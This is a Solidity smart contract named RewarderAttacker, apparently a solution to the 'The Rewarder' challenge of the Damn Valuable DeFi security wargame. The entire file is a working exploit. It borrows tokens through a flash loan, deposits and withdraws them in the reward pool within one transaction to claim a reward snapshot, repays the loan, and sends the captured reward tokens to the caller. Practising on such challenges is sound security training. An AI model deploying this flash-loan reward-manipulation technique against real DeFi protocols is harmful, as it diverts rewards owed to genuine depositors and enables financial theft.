// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../DamnValuableToken.sol";
import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/TheRewarderPool.sol";
contract RewarderAttacker {
    DamnValuableToken private immutable liquidityToken;
    FlashLoanerPool private immutable flashLoanerPool;
    TheRewarderPool private immutable rewarderPool;
    RewardToken private immutable rewardToken;

    constructor(address liquidityTokenAddress, address flashLoanerPoolAddress, address rewarderPoolAddress, address rewardTokenAddress) {
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        flashLoanerPool = FlashLoanerPool(flashLoanerPoolAddress);
        rewarderPool = TheRewarderPool(rewarderPoolAddress);
        rewardToken = RewardToken(rewardTokenAddress);
    }

    function attack(uint256 amount) external {
        flashLoanerPool.flashLoan(amount);
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(msg.sender, amount);

    }
}